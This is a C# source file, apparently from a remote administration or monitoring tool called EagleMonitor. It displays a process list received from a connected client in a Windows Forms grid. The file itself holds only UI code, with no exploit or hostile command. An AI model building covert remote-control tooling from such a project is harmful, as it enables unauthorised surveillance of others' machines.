using EagleMonitor.Networking;
using EagleMonitor.Utils;
using PacketLib.Packet;
using System.Drawing;
using System.Threading;
using System.Windows.Forms;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace EagleMonitor.PacketParser
{
    internal class ProcessManagerPacketHandler
    {
        public ProcessManagerPacketHandler(ProcessManagerPacket processManagerPacket, ClientHandler clientHandler) : base() 
        {
            new Thread(() =>
            {
                try
                {
                    Bitmap resized = new Bitmap(Properties.Resources.imageres_15.ToBitmap(), new Size((int)(Properties.Resources.imageres_15.ToBitmap().Size.Width / 1.5), (int)(Properties.Resources.imageres_15.ToBitmap().Size.Height / 1.5)));

                    clientHandler.processManagerForm.processDataGridView.BeginInvoke((MethodInvoker)(() =>
                    {
                        clientHandler.processManagerForm.processDataGridView.Rows.Clear();
                        foreach (Proc proc in processManagerPacket.processes)
                        {
                            int rowId = clientHandler.processManagerForm.processDataGridView.Rows.Add();

                            DataGridViewRow row = clientHandler.processManagerForm.processDataGridView.Rows[rowId];
                            if (proc.processIcon != null)
                            {
                                row.Cells["Column1"].Value = new Bitmap(PacketLib.Utils.ImageProcessing.BytesToImage(proc.processIcon), resized.Size);
                            }
                            else
                            {
                                row.Cells["Column1"].Value = resized;
                            }

                            row.Cells["Column2"].Value = proc.processId.ToString();
                            row.Cells["Column3"].Value = proc.processName;
                            row.Cells["Column4"].Value = proc.processWindowTitle;
                            row.Cells["Column5"].Value = proc.processWindowHandle;
                            row.Cells["Column6"].Value = proc.is64Bit;
                        }

                        clientHandler.processManagerForm.loadingCircle1.Visible = false;
                        clientHandler.processManagerForm.loadingCircle1.Active = false;             
                    }));
                    return;
                }
                catch { }
            }).Start();
        }
    }
}
